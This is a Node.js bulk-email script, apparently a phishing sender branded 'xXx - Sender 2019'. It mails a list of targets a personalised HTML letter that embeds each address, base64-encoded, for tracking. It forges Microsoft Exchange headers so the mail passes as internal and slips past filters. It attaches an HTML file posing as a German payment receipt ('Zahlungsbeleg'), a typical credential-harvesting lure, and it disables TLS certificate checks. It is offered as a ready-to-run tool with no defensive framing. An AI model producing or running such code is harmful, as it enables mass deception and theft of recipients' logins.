'use strict';
const nodemailer = require('nodemailer');
const chalk = require('chalk');
const delay = require('delay');
const _ = require('lodash');
const fs = require('fs');
const randomstring = require('randomstring');
process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";

async function checkSMTP(data) {
    try {
        let transporter = nodemailer.createTransport({
            pool: true,
            host: data.host,
            port: data.port,
            secure: data.secure,
            auth: {
                user: data.user,
                pass: data.pass
            }
        });
        await transporter.verify();
        return Promise.resolve(transporter);
    } catch(err) {
        return Promise.reject(`SMTP ERROR => ${err.message}`);
    }
}

async function readFrom(from, email, timezone) {
    try {
        from = from.replace(/SILENTCODERSHOUR24/g, timezoneSet(timezone, "fulltime24"));
        from = from.replace(/SILENTCODERSHOUR12/g, timezoneSet(timezone, "fulltime12"));
        from = from.replace(/SILENTCODERSMINUTE/g, timezoneSet(timezone, "i"));
        from = from.replace(/SILENTCODERSSECOND/g, timezoneSet(timezone, "s"));
        from = from.replace(/SILENTCODERSDAY/g, timezoneSet(timezone, "d"));
        from = from.replace(/SILENTCODERSMONTH/g, timezoneSet(timezone, "m"));
        from = from.replace(/SILENTCODERSYEAR/g, timezoneSet(timezone, "Y"));
        from = from.replace(/SILENTCODERSFULLDATE/g, timezoneSet(timezone, "full"));
        from = from.replace(/SILENTCODERS2FULLDATE/g, timezoneSet(timezone, "full2"));
        from = from.replace(/SILENTCODERSDATEONLY1/g, timezoneSet(timezone, "jdate"));
        from = from.replace(/SILENTCODERSDATEONLY2/g, timezoneSet(timezone, "jdate2"));
        from = from.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        from = from.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        from = from.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        from = from.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        from = from.replace(/SILENTCODERSEMAIL/g, email);
        from = from.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        from = from.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        return Promise.resolve(from);
    } catch(err) {
        return Promise.reject(err);
    }
}

function timezoneSet(timezone, get) {
    let nDate;
    const obj = {
        timeZone: timezone
    };
    if(get == "H") {
        obj.hour = '2-digit';
        obj.hour12 = false;
    } else if(get == "h") {
        obj.hour = '2-digit';
    } else if(get == "i") {
        obj.minute = '2-digit';
    } else if(get == "s") {
        obj.second = '2-digit';
    } else if(get == "d") {
        obj.day = 'numeric';
    } else if(get == "d") {
        obj.weekday = 'long';
    } else if(get == "m") {
        obj.month = 'long';
    } else if(get == "Y") {
        obj.year = 'numeric';
    } else if(get == "full") {
        obj.day = 'numeric';
        obj.month = 'long';
        obj.year = 'numeric';
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
        } else if(get == "full2") {
        obj.day = 'numeric';
        obj.month = 'numeric';
        obj.year = 'numeric';
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
    } else if(get == "jdate") {
        obj.weekday = 'short';
        obj.day = 'numeric';
        obj.month = 'long';
        obj.year = 'numeric';
    } else if(get == "jdate2") {
        obj.day = 'numeric';
        obj.month = 'numeric';
        obj.year = 'numeric';
    } else if(get == "fulltime24") {
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
        obj.hour12 = false;
    } else if(get == "fulltime12") {
        obj.hour = '2-digit';
        obj.minute = '2-digit';
        obj.second = '2-digit';
    }
    nDate = new Date().toLocaleString('en-us', obj);
    return nDate;
}
async function readLetter(letter, email, timezone) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/SILENTCODERSHOUR24/g, timezoneSet(timezone, "fulltime24"));
        sletter = sletter.replace(/SILENTCODERSHOUR12/g, timezoneSet(timezone, "fulltime12"));
        sletter = sletter.replace(/SILENTCODERSMINUTE/g, timezoneSet(timezone, "i"));
        sletter = sletter.replace(/SILENTCODERSSECOND/g, timezoneSet(timezone, "s"));
        sletter = sletter.replace(/SILENTCODERSDAY/g, timezoneSet(timezone, "d"));
        sletter = sletter.replace(/SILENTCODERSMONTH/g, timezoneSet(timezone, "m"));
        sletter = sletter.replace(/SILENTCODERSYEAR/g, timezoneSet(timezone, "Y"));
        sletter = sletter.replace(/SILENTCODERSFULLDATE/g, timezoneSet(timezone, "full"));
        sletter = sletter.replace(/SILENTCODERS2FULLDATE/g, timezoneSet(timezone, "full2"));
        sletter = sletter.replace(/SILENTCODERSDATEONLY1/g, timezoneSet(timezone, "jdate"));
        sletter = sletter.replace(/SILENTCODERSDATEONLY2/g, timezoneSet(timezone, "jdate2"));
        sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);
        sletter = sletter.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        sletter = sletter.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readLetterAttachments(letter, email, timezone) {
    try {
        let sletter = await fs.readFileSync(letter, 'utf-8');
        sletter = sletter.replace(/SILENTCODERSHOUR24/g, timezoneSet(timezone, "fulltime24"));
        sletter = sletter.replace(/SILENTCODERSHOUR12/g, timezoneSet(timezone, "fulltime12"));
        sletter = sletter.replace(/SILENTCODERSMINUTE/g, timezoneSet(timezone, "i"));
        sletter = sletter.replace(/SILENTCODERSSECOND/g, timezoneSet(timezone, "s"));
        sletter = sletter.replace(/SILENTCODERSDAY/g, timezoneSet(timezone, "d"));
        sletter = sletter.replace(/SILENTCODERSMONTH/g, timezoneSet(timezone, "m"));
        sletter = sletter.replace(/SILENTCODERSYEAR/g, timezoneSet(timezone, "Y"));
        sletter = sletter.replace(/SILENTCODERSFULLDATE/g, timezoneSet(timezone, "full"));
        sletter = sletter.replace(/SILENTCODERS2FULLDATE/g, timezoneSet(timezone, "full2"));
        sletter = sletter.replace(/SILENTCODERSDATEONLY1/g, timezoneSet(timezone, "jdate"));
        sletter = sletter.replace(/SILENTCODERSDATEONLY2/g, timezoneSet(timezone, "jdate2"));
        sletter = sletter.replace(/SILENTCODERSEMAIL/g, email);
        sletter = sletter.replace(/EMAILURLSILENTC0DERS/g, Buffer.from(email).toString('base64'));
        sletter = sletter.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        sletter = sletter.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        sletter = sletter.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        sletter = sletter.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        sletter = sletter.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        sletter = sletter.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        return Promise.resolve(sletter);
    } catch(err){
        return Promise.reject(err);
    }
}

async function readSubject(subject, email, timezone) {
    try {
        subject = subject.replace(/SILENTCODERSHOUR24/g, timezoneSet(timezone, "fulltime24"));
        subject = subject.replace(/SILENTCODERSHOUR12/g, timezoneSet(timezone, "fulltime12"));
        subject = subject.replace(/SILENTCODERSMINUTE/g, timezoneSet(timezone, "i"));
        subject = subject.replace(/SILENTCODERSSECOND/g, timezoneSet(timezone, "s"));
        subject = subject.replace(/SILENTCODERSDAY/g, timezoneSet(timezone, "d"));
        subject = subject.replace(/SILENTCODERSMONTH/g, timezoneSet(timezone, "m"));
        subject = subject.replace(/SILENTCODERSYEAR/g, timezoneSet(timezone, "Y"));
        subject = subject.replace(/SILENTCODERSFULLDATE/g, timezoneSet(timezone, "full"));
        subject = subject.replace(/SILENTCODERS2FULLDATE/g, timezoneSet(timezone, "full2"));
        subject = subject.replace(/SILENTCODERSDATEONLY1/g, timezoneSet(timezone, "jdate"));
        subject = subject.replace(/SILENTCODERSDATEONLY2/g, timezoneSet(timezone, "jdate2"));
        subject = subject.replace(/USER/g, email.replace(/@[^@]+$/, ''));
        subject = subject.replace(/DOMAIN/g, email.replace(/.*@/, ''));
        subject = subject.replace(/DOMC/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0].charAt(0).toUpperCase() + email.match(/(?<=@)[^.]+(?=\.)/g)[0].slice(1));
        subject = subject.replace(/DOMs/g, email.match(/(?<=@)[^.]+(?=\.)/g)[0]);
        subject = subject.replace(/SILENTCODERSEMAIL/g, email);
        subject = subject.replace(/SILENTCODERSLIMAHURUF/g, randomstring.generate({length: 5, charset: 'alphabetic'}));
        subject = subject.replace(/SILENTCODERSBANYAKHURUF/g, randomstring.generate({length: 50, charset: 'alphabetic'}));
        return Promise.resolve(subject);
    } catch(err) {
        return Promise.reject(err);
    }
}

(async function() {
    console.log(chalk`
{bold xXx - Sender 2019}
{bold.red Code by xXx | admin@xXx.com} @ {green xXx.NET}
    `);
    if (process.argv[2] == undefined) {
        console.log('Usage : node file.js listname.txt');
        process.exit(1);
    }
    const smtpConfigData = fs.readFileSync('settings.txt', 'utf-8').split('\n');
    let smtpConfig = {
        host: smtpConfigData[0].trim(),
        port: smtpConfigData[1].trim(),
        secure: smtpConfigData[2].trim() === '465', // Set secure based on port
        user: smtpConfigData[3].trim(),
        pass: smtpConfigData[4].trim()
    };
    const transporter = await checkSMTP(smtpConfig);
    console.log(chalk`{bold [!] SMTP Checked, ready to use !}\n`);
    console.log(chalk`{bold [>] Open list file, ${process.argv[2]}.}`);
    let mailist = await fs.readFileSync(process.argv[2], 'utf-8');
    let emailist = mailist.split(/\r?\n/);
    console.log(chalk`{bold [!] Found ${emailist.length} line.}\n`);
    emailist = _.chunk(emailist, 1);
    for(let i = 0; i < emailist.length; i++) {
        await Promise.all(emailist[i].map(async(email) => {
            if(email.match(/^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/)) {
                const doL = await readLetter('message.html', email, "Australia/Perth");
                const doF = await readFrom(smtpConfigData[5].trim(), email);
                const doS = await readSubject(smtpConfigData[6].trim(), email);
                try {
                    let mailConfig = {
                        from: doF,
                        html: doL,
                        subject: doS,
                        to: email,
                        headers: {
                            'X-MS-Exchange-Organization-MessageDirectionality': 'Originating',
                            'X-MS-Exchange-Organization-AuthAs': 'Internal',
                            'X-MS-Exchange-Organization-AuthMechanism': '02',
                            'X-MS-Exchange-Organization-AuthSource': 'MWHPR22MB0014.namprd22.prod.outlook.com',
                            'X-MS-Exchange-Organization-Network-Message-Id': 'ffe8bf42-c85a-42c8-a084-08d75b722819',
                            'X-MA4-NODE':'false'
                    },
                    attachments: [{
                        filename: "Zahlungsbeleg .htm",
                        content: await readLetterAttachments(__dirname+'/attach.html', email)
                    }]
                    };
                    await transporter.sendMail(mailConfig);
                    console.log(chalk`{bold ${email} => SUCCESS}`);
                } catch(err) {
                    console.log(chalk`{bold ${email} => ERROR : ${err.message}}`);
await fs.appendFileSync('logs-failed.txt', email+' => '+err.message+'\n');
                    }
                }
            }
        ));
    }
})();